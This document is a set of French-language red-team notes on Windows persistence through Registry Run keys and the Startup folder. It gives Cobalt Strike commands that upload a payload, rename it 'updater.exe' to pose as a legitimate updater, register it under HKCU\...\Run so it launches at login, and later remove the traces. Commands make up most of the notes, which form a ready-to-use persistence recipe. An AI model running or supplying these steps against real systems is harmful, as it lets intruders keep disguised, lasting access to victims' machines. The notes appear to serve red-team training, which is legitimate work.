

[[#Registry Run Keys]]
[[#Startup Folder]]

# Registry Run Keys

Clés de registre chargés au login d'un user.

- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce


### Cobalt Strike

Upload notre exécutable dans C:\Users\<USER>\AppData\Local\Microsoft\WindowsApps

```
cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
upload C:\Payloads\http_x64.exe
mv http_x64.exe updater.exe
```

Ajouter une l'exécutable à la clé de registre Software\Microsoft\Windows\CurrentVersion\Run dans HKCU (format : `reg_set <host:optional> <hive> <key> <value> <type> <data>`)

```
reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
```

Confirmer la création de la clé de registre

```
reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```

Supprimer la valeur créée

```
reg_delete HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```

---
# Startup Folder

De la même manière que les clés Run, s'éxecute au Login du user.

Folder -> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

### Cobalt Strike

Upload du fichier dans %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

```
cd C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
upload C:\Payloads\http_x64.exe
mv http_x64.exe updater.exe
```

supprimer le fichier

```
rm C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe
```

